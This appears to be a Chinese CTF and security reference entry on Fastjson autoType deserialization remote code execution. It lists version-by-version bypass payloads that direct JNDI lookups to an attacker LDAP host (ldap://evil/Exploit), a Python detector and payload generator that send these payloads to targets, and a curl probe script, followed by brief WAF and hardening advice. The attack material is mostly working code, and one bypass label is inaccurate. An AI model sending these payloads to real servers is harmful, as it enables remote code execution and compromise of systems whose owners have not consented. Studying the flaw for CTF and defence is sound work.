---
category: "Java反序列化/JSON库漏洞"
tags: ["Fastjson", "反序列化", "JNDI", "autoType", "绕过", "CTF高频"]
difficulty: "中级"
cve: "多个CVE (详见内文)"
cvss: "9.8"
affected: "Fastjson <= 1.2.80 (各版本存在不同绕过)"
poc_available: true
---

# Fastjson反序列化远程代码执行漏洞
> **多CVE** | **CVSS 9.8** | **2017年首次披露 - 至今持续有新绕过**

## 1. 概述

### 漏洞名称
Fastjson自动类型转换(autotype)导致的反序列化远程代码执行漏洞

### CVE编号（按时间线）
| CVE编号 | Fastjson版本 | 绕过方式 |
|---------|-------------|----------|
| N/A (2017) | <= 1.2.24 | `@type` 直接指定任意类 |
| CVE-2017-18349 | <= 1.2.25 | 黑名单绕过 |
| N/A (2019) | <= 1.2.47 | AutoCloseable绕过 |
| CVE-2020-8840 | <= 1.2.62 | JNDI注入 |
| CVE-2021-25641 | <= 1.2.66 | 期望类绕过 |
| N/A (2022) | <= 1.2.80 | 最新期望类绕过 |

### CTF中的应用形式
- **CTF超高频漏洞**: 中国CTF中Fastjson是TOP3最常见漏洞
- **典型题目**:
  - JSON输入点利用（登录/搜索/API接口）
  - 结合JNDI/LDAP进行RCE
  - autotype绕过各种安全限制
  - TemplatesImpl字节码加载
  - 结合BCEL/Common-IO等方法绕过

## 2. 漏洞原理

### 2.1 autotype机制缺陷

```java
// Fastjson核心解析
// 当JSON中包含 @type 字段时，Fastjson通过反射实例化对应类
// 例如: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}

// 解析流程:
// 1. DefaultJSONParser.parseObject() 读取 @type 值
// 2. TypeUtils.loadClass() 加载指定类
// 3. 通过反射调用setter方法设置属性
// 4. getter方法可能被自动调用（触发JNDI lookup等危险操作）
```

### 2.2 历史绕过方式

```python
# 绕过进化史
# v1.2.24: 无限制 @type
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil/Exploit","autoCommit":true}

# v1.2.25-41: 黑名单机制 -> L开头绕过
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://evil/Exploit","autoCommit":true}

# v1.2.42: 双写L绕过
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://evil/Exploit","autoCommit":true}

# v1.2.43: [ 绕过
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://evil/Exploit","autoCommit":true}

# v1.2.45: mybatis利用
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://evil/Exploit"}}

# v1.2.47: AutoCloseable绕过 (无黑名单限制)
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil/Exploit","autoCommit":true}}

# v1.2.62: JNDI高版本绕过
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://evil/Exploit"}

# v1.2.66: 期望类绕过
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://evil/Exploit"}

# v1.2.68: 写文件+读文件
{"@type":"org.apache.commons.io.input.BOMInputStream"...}

# v1.2.80: 更广泛的期望类
```

### 2.3 核心问题

Fastjson的`checkAutoType()`函数虽然引入了黑名单机制，但攻击面太广：
1. 黑名单不完整，总有遗漏的类
2. `expectClass`参数可以被绕过
3. 各种JDK内置类也可以利用
4. 第三方库（mybatis, shiro, commons-io等）扩展了攻击面

## 3. 环境搭建

```bash
# Docker环境
docker pull vulfocus/fastjson-1.2.24-rce:latest
docker run -d -p 8080:8080 --name fastjson-vuln vulfocus/fastjson-1.2.24-rce:latest

# 多版本环境
for version in 1.2.24 1.2.47 1.2.68 1.2.80; do
    docker run -d -p $((8080+${version##*.})):8080 --name fastjson-${version} \
        fastjson-demo:${version}
done

# 离线准备
docker pull vulfocus/fastjson-1.2.24-rce:latest
docker save vulfocus/fastjson-1.2.24-rce:latest -o fastjson-vuln.tar
```

## 4. POC/EXP

### 4.1 Fastjson多版本综合检测脚本

```python
#!/usr/bin/env python3
"""
Fastjson反序列化漏洞多版本检测脚本
覆盖版本: 1.2.24 ~ 1.2.80
检测方法: 类型解析差异 + DNS带外 + 异常响应分析
"""

import requests
import json
import time
import argparse
import base64
import dns.resolver  # pip install dnspython
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
import urllib3
urllib3.disable_warnings()

TIMEOUT = 10
USER_AGENT = "Fastjson-Detector/3.0"


class FastjsonDetector:
    """Fastjson漏洞检测器"""

    def __init__(self, target, dns_domain=None, callback_host=None, verbose=False):
        self.target = target.rstrip("/")
        self.dns_domain = dns_domain
        self.callback_host = callback_host
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": USER_AGENT,
            "Content-Type": "application/json",
        })

    def log(self, msg, level="INFO"):
        levels = {"INFO": "[*]", "GOOD": "[+]", "VULN": "[!!!]", "WARN": "[!]"}
        if level in ("VULN",) or self.verbose:
            print(f"{levels.get(level, '[*]')} {msg}")

    def json_endpoint_discovery(self):
        """发现JSON输入端点"""
        endpoints = []
        
        # 常见JSON端点的GET/POST探测
        test_paths = [
            "/", "/api", "/api/user", "/api/login", "/api/data",
            "/json", "/data", "/parse", "/convert",
            "/user/login", "/user/register",
            "/admin/json", "/admin/data",
            "/fastjson", "/test", "/debug",
        ]

        for path in test_paths:
            url = f"{self.target}{path}"
            try:
                # POST JSON测试
                test_json = {"test": "value", "id": 1}
                resp = self.session.post(url, json=test_json, timeout=TIMEOUT)

                # 检查响应是否为JSON
                if "application/json" in resp.headers.get("Content-Type", ""):
                    endpoints.append(("POST", path, "JSON_Response"))
                    self.log(f"发现JSON端点: POST {path}", "GOOD")
                elif resp.status_code != 404:
                    # 即使返回非JSON，也可能处理JSON输入
                    endpoints.append(("POST", path, f"HTTP_{resp.status_code}"))

                # 带JSON Content-Type的GET
                resp = self.session.get(url, headers={"Accept": "application/json"}, timeout=TIMEOUT)
                if "application/json" in resp.headers.get("Content-Type", ""):
                    endpoints.append(("GET", path, "JSON_Response"))
            except:
                pass

        return endpoints

    def fastjson_type_detection(self):
        """
        通过类型解析差异检测Fastjson
        Fastjson特殊解析行为:
        1. $ref 循环引用
        2. 超长数字精度丢失
        3. 特殊字符处理
        """
        tests = []

        # Test 1: $ref 循环引用 (Fastjson特有)
        ref_payload = '{"$ref":"$.test"}'
        try:
            resp = self.session.post(self.target, data=ref_payload, timeout=TIMEOUT)
            if resp.status_code != 400 and resp.elapsed.total_seconds() < 3:
                tests.append({"type": "ref", "result": "possible_fastjson"})
                self.log("检测到$ref特征 (Fastjson/hutool-json)", "GOOD")
        except:
            pass

        # Test 2: 正常JSON响应基准
        normal_payload = json.dumps({"test": "normal", "id": 12345})
        try:
            resp_normal = self.session.post(self.target, data=normal_payload, timeout=TIMEOUT)
            normal_status = resp_normal.status_code
            normal_length = len(resp_normal.text)
        except:
            normal_status = 200
            normal_length = 0

        # Test 3: @type探测
        type_payload = '{"@type":"java.lang.String"}'
        try:
            resp_type = self.session.post(self.target, data=type_payload, timeout=TIMEOUT*2)
            if resp_type.status_code != normal_status:
                self.log(f"@type响应差异: {normal_status} vs {resp_type.status_code}", "VULN")
                tests.append({"type": "autotype", "result": "detected"})
            if abs(len(resp_type.text) - normal_length) > 10:
                tests.append({"type": "autotype", "result": "length_diff"})
        except:
            pass

        # Test 4: 超大数字精度检测
        bigint_payload = '{"num":99999999999999999999999999999999999999999999999999}'
        try:
            resp = self.session.post(self.target, data=bigint_payload, timeout=TIMEOUT)
            if "999999999" in resp.text:
                tests.append({"type": "bigint", "result": "bigint_as_string"})
                self.log("大数字以字符串形式返回 (Fastjson特征)", "GOOD")
        except:
            pass

        return tests

    def fastjson_version_fingerprint(self):
        """
        Fastjson版本指纹识别
        通过不同版本对特殊payload的不同响应识别版本
        """
        version_tests = {
            "1.2.24": [
                '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://test.local/Test","autoCommit":true}',
            ],
            "1.2.47": [
                '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://test.local/Test","autoCommit":true}}',
            ],
            "1.2.68+": [
                '{"@type":"org.apache.commons.io.input.BOMInputStream","dataSourceName":"ldap://test/Test","autoCommit":true}',
            ],
        }

        for version, payloads in version_tests.items():
            for payload in payloads:
                try:
                    resp = self.session.post(
                        self.target,
                        data=payload,
                        timeout=5
                    )
                    
                    # 解析错误信息判断版本
                    error_text = resp.text.lower()
                    if "autotype is not support" in error_text:
                        self.log(f"版本 >= 1.2.25 (autotype限制)", "INFO")
                        return ">= 1.2.25"
                    if "safeMode" in error_text:
                        self.log(f"版本 >= 1.2.68 (SafeMode)", "INFO")
                        return ">= 1.2.68"
                    if resp.status_code == 500:
                        if "classnotfound" in error_text or "ClassNotFoundException" in resp.text:
                            self.log(f"JdbcRowSetImpl被拦截或不存在", "INFO")
                            return f"unknown (rejected {version} test)"
                        
                except requests.exceptions.Timeout:
                    self.log(f"可能触发DNS请求: {version} payload导致超时", "WARN")
                except:
                    pass

        return "unknown"

    def jndi_callback_test(self, callback_url):
        """
        使用JNDI回调检测Fastjson漏洞
        通过DNS带外确认漏洞存在
        """
        import random
        import string

        random_id = "".join(random.choices(string.ascii_lowercase, k=8))
        ldap_url = f"ldap://{random_id}.{callback_url}/Exploit"

        # 多版本payload组合
        payloads = [
            # 1.2.24
            {
                "version": "1.2.24",
                "payload": json.dumps({
                    "@type": "com.sun.rowset.JdbcRowSetImpl",
                    "dataSourceName": ldap_url,
                    "autoCommit": True
                })
            },
            # 1.2.47 AutoCloseable绕过
            {
                "version": "1.2.47",
                "payload": json.dumps({
                    "a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"},
                    "b": {
                        "@type": "com.sun.rowset.JdbcRowSetImpl",
                        "dataSourceName": ldap_url,
                        "autoCommit": True
                    }
                })
            },
            # 1.2.68+ 期望类绕过
            {
                "version": "1.2.68",
                "payload": json.dumps({
                    "@type": "org.apache.shiro.jndi.JndiObjectFactory",
                    "resourceName": ldap_url
                })
            },
            # 通用绕过
            {
                "version": "generic",
                "payload": json.dumps({
                    "x": {
                        "@type": "java.net.InetAddress",
                        "val": f"{random_id}.{callback_url}"
                    }
                })
            },
        ]

        results = []
        for p in payloads:
            try:
                start = time.time()
                resp = self.session.post(self.target, data=p["payload"], timeout=15)
                elapsed = time.time() - start

                if elapsed > 5:
                    self.log(f"时间延迟{elapsed:.1f}s [{p['version']}]", "VULN")
                    results.append({
                        "version": p["version"],
                        "type": "time_blind",
                        "delay": elapsed,
                        "dns_query": f"{random_id}.{callback_url}"
                    })
            except requests.exceptions.Timeout:
                self.log(f"请求超时 [{p['version']}] - 可能已触发DNS查询", "VULN")
                results.append({
                    "version": p["version"],
                    "type": "timeout",
                    "dns_query": f"{random_id}.{callback_url}"
                })
            except Exception as e:
                pass

            time.sleep(1)

        return results

    def comprehensive_detect(self, dns_domain=None):
        """综合检测流程"""
        print(f"""
    ╔══════════════════════════════════════════╗
    ║  Fastjson Deserialization Detector      ║
    ║  Multi-Version: 1.2.24 ~ 1.2.80        ║
    ╚══════════════════════════════════════════╝
    """)
        print(f"[*] 目标: {self.target}")

        results = {
            "fastjson_detected": False,
            "version": "unknown",
            "jndi_triggered": [],
            "gadget_found": False,
        }

        # Step 1: JSON端点发现
        print("\n[Step 1] JSON端点发现...")
        endpoints = self.json_endpoint_discovery()
        if endpoints:
            self.log(f"发现 {len(endpoints)} 个JSON端点", "GOOD")
            for method, path, hint in endpoints:
                self.log(f"  {method} {path} ({hint})", "INFO")
        else:
            self.log("未发现明显JSON端点", "WARN")

        # Step 2: Fastjson类型特征检测
        print("\n[Step 2] Fastjson类型解析特征检测...")
        type_tests = self.fastjson_type_detection()
        if type_tests:
            self.log("检测到Fastjson类型解析特征", "VULN")
            results["fastjson_detected"] = True

        # Step 3: 版本指纹识别
        print("\n[Step 3] 版本指纹识别...")
        version = self.fastjson_version_fingerprint()
        self.log(f"推测版本: {version}", "INFO")
        results["version"] = version

        # Step 4: JNDI/DNS回调检测
        if dns_domain:
            print(f"\n[Step 4] DNS带外检测 (domain: {dns_domain})...")
            jndi_results = self.jndi_callback_test(dns_domain)
            if jndi_results:
                self.log(f"检测到 {len(jndi_results)} 个JNDI触发", "VULN")
                for r in jndi_results:
                    self.log(f"  版本: {r['version']}, 类型: {r['type']}, 查询: {r.get('dns_query', 'N/A')}")
                results["jndi_triggered"] = jndi_results
                results["fastjson_detected"] = True
            else:
                self.log("未检测到DNS回调", "INFO")
        else:
            print("\n[Step 4] 建议使用 --dns-domain 参数进行带外验证")

        # 总结
        print("\n" + "=" * 50)
        if results["jndi_triggered"]:
            print("[!!!] 确认目标存在Fastjson反序列化漏洞！")
            for r in results["jndi_triggered"]:
                print(f"  - 可利用版本: {r['version']}")
                print(f"  - 利用方式: {r['type']}")
        elif results["fastjson_detected"]:
            print("[!] 检测到Fastjson特征但未确认漏洞")
            print("  - 可能原因: 网络限制、黑名单拦截、安全模式")
            print("  - 建议: 使用DNS带外验证或尝试其他绕过方式")
        else:
            print("[-] 未检测到Fastjson漏洞特征")

        return results


class DNSCallbackServer:
    """简易DNS回调服务器（接收Fastjson触发的DNS请求）"""

    def __init__(self, port=53):
        self.port = port
        self.received = []

    def start(self):
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("0.0.0.0", self.port))
        sock.settimeout(30)
        print(f"[*] DNS监听端口 {self.port} (需要root权限或端口转发)")

        try:
            while True:
                data, addr = sock.recvfrom(1024)
                print(f"[DNS] 收到来自 {addr} 的DNS请求")
                self.received.append({"addr": addr, "data": data.hex()})
        except socket.timeout:
            print("[*] DNS监听超时")
        finally:
            sock.close()

        return self.received


def main():
    parser = argparse.ArgumentParser(
        description="Fastjson反序列化漏洞多版本检测工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  # 基础检测
  python fastjson_detector.py -t http://target:8080

  # DNS带外检测 (推荐)
  python fastjson_detector.py -t http://target:8080 -d your.dnslog.cn

  # 代理模式
  python fastjson_detector.py -t http://target:8080 --proxy http://127.0.0.1:8080

  # 自定义回调IP
  python fastjson_detector.py -t http://target:8080 -c 192.168.1.100

注意:
  - 带外检测需要DNS或LDAP回调能力
  - 在CTF离线模式中，可通过时间盲注判断漏洞存在性
        """
    )
    parser.add_argument("-t", "--target", required=True, help="目标URL")
    parser.add_argument("-d", "--dns-domain", help="DNSLog域名用于带外检测")
    parser.add_argument("-c", "--callback-host", help="JNDI回调服务器IP")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--proxy", help="HTTP代理地址")

    args = parser.parse_args()

    detector = FastjsonDetector(
        args.target,
        dns_domain=args.dns_domain,
        callback_host=args.callback_host,
        verbose=args.verbose
    )

    results = detector.comprehensive_detect(args.dns_domain)

    print("\n[*] 检测完成。")


if __name__ == "__main__":
    main()
```

### 4.2 Fastjson Payload生成器

```python
#!/usr/bin/env python3
"""
Fastjson Payload生成器
生成各种版本对应的检测payload
"""

import json
import argparse

def generate_payloads(ldap_url):
    """生成所有版本对应的payload"""
    payloads = {}

    # 1.2.24 - 基础payload
    payloads["1.2.24"] = json.dumps({
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": ldap_url,
        "autoCommit": True
    }, indent=2)

    # 1.2.25-1.2.41 - L绕黑名单
    payloads["1.2.41_L_bypass"] = json.dumps({
        "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
        "dataSourceName": ldap_url,
        "autoCommit": True
    }, indent=2)

    # 1.2.42 - LL双写绕过
    payloads["1.2.42_LL_bypass"] = json.dumps({
        "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
        "dataSourceName": ldap_url,
        "autoCommit": True
    }, indent=2)

    # 1.2.43 - [ 绕过
    payloads["1.2.43_bracket_bypass"] = json.dumps({
        "@type": "[com.sun.rowset.JdbcRowSetImpl" "[{\"dataSourceName\":\"" + ldap_url + "\",\"autoCommit\":true}"
    }, indent=2)

    # 1.2.45 - mybatis bypass
    payloads["1.2.45_mybatis"] = json.dumps({
        "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
        "properties": {"data_source": ldap_url}
    }, indent=2)

    # 1.2.47 - AutoCloseable bypass (最常用绕过)
    payloads["1.2.47_mappings"] = json.dumps({
        "a": {
            "@type": "java.lang.Class",
            "val": "com.sun.rowset.JdbcRowSetImpl"
        },
        "b": {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": ldap_url,
            "autoCommit": True
        }
    }, indent=2)

    # 1.2.62 - JNDIConverter
    payloads["1.2.62_jndi_converter"] = json.dumps({
        "@type": "org.apache.xbean.propertyeditor.JndiConverter",
        "AsText": ldap_url
    }, indent=2)

    # 1.2.66 - shiro jndi
    payloads["1.2.66_shiro"] = json.dumps({
        "@type": "org.apache.shiro.jndi.JndiObjectFactory",
        "resourceName": ldap_url
    }, indent=2)

    # 1.2.68+ - commons-io
    payloads["1.2.68_commons_io"] = json.dumps({
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "is": {
            "@type": "org.apache.commons.io.input.TeeInputStream",
            "input": ldap_url
        }
    }, indent=2)

    # 通用 - InetAddress DNS探测
    payloads["dns_probe"] = json.dumps({
        "@type": "java.net.InetAddress",
        "val": ldap_url.replace("ldap://", "")
    }, indent=2)

    # 通用 - InetSocketAddress
    payloads["dns_probe_v2"] = json.dumps({
        "@type": "java.net.InetSocketAddress",
        "address": ldap_url.replace("ldap://", ""),
        "val": ldap_url.replace("ldap://", "")
    }, indent=2)

    return payloads


def main():
    parser = argparse.ArgumentParser(description="Fastjson Payload Generator")
    parser.add_argument("--ldap", default="ldap://your-dnslog.cn/Exploit", help="LDAP/JNDI回调URL")
    parser.add_argument("--output", help="输出到文件")
    parser.add_argument("--version", help="仅输出指定版本的payload")

    args = parser.parse_args()

    payloads = generate_payloads(args.ldap)

    if args.version:
        if args.version in payloads:
            print(payloads[args.version])
        else:
            print(f"未知版本: {args.version}")
            print(f"可用版本: {', '.join(payloads.keys())}")
    else:
        output = []
        for version, payload in payloads.items():
            output.append(f"\n{'='*60}")
            output.append(f"Version: {version}")
            output.append(f"{'='*60}")
            output.append(payload)

        result = "\n".join(output)

        if args.output:
            with open(args.output, "w") as f:
                f.write(result)
            print(f"[*] Payload已保存到: {args.output}")
        else:
            print(result)


if __name__ == "__main__":
    main()
```

### 4.3 Fastjson指纹快速检测(Bash)

```bash
#!/bin/bash
# fastjson_quick_detect.sh
# 快速检测目标是否使用Fastjson

TARGET="$1"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

echo "[*] Fastjson Quick Detection: $TARGET"

# Test 1: $ref
echo "[Test 1] $ref circular reference..."
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"$ref":"$.test"}' \
    -w "\nStatus: %{http_code}\n" 2>/dev/null

# Test 2: @type
echo "[Test 2] @type autotype..."
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"@type":"java.lang.String","value":"test"}' \
    -w "\nStatus: %{http_code}\n" 2>/dev/null

# Test 3: Big Integer
echo "[Test 3] Big integer precision..."
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"id":99999999999999999999999999999999999999999}' \
    -w "\nStatus: %{http_code}\n" 2>/dev/null

# Test 4: DNS probe (需要替换为你的dnslog域名)
echo "[Test 4] DNS probe..."
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"@type":"java.net.InetAddress","val":"dnslog.example.com"}' \
    -w "\nStatus: %{http_code}\n" 2>/dev/null

echo "[*] Done. Check DNSLog platform for callbacks."
```

## 5. 检测与防御

### 5.1 WAF规则

```nginx
# Nginx层面过滤
if ($request_body ~* "@type") {
    return 403;
}
if ($request_body ~* "JdbcRowSetImpl|JndiConverter|JndiObjectFactory") {
    return 403;
}
```

### 5.2 Fastjson安全加固

```java
// 方案1: 升级Fastjson
// <version>1.2.83</version> 或更高

// 方案2: 开启SafeMode (1.2.68+)
ParserConfig.getGlobalInstance().setSafeMode(true);

// 方案3: 使用autotype白名单
ParserConfig.getGlobalInstance().addAccept("com.yourpackage.");

// 方案4: 替换Fastjson
// 迁移到 Jackson 或 Gson
```

## 6. 相关知识点

### 6.1 关联的CTF题目
- **版本识别+绕过选择**: 根据返回信息判断Fastjson版本，选择合适的payload
- **内网JNDI利用**: 当目标不能出网时，利用本地gadget
- **黑白盒结合**: 题目提供jar包，分析Fastjson版本和依赖确定利用链

### 6.2 相似漏洞对比

| 漏洞 | 利用方式 | CTF常见度 |
|------|----------|-----------|
| Fastjson反序列化 | JSON @type -> JNDI/RCE | 极高 |
| Jackson反序列化 | enableDefaultTyping -> RCE | 高 |
| Gson反序列化 | TypeToken bypass | 低 |
| SnakeYAML RCE | !!javax.script.ScriptEngineManager | 中 |
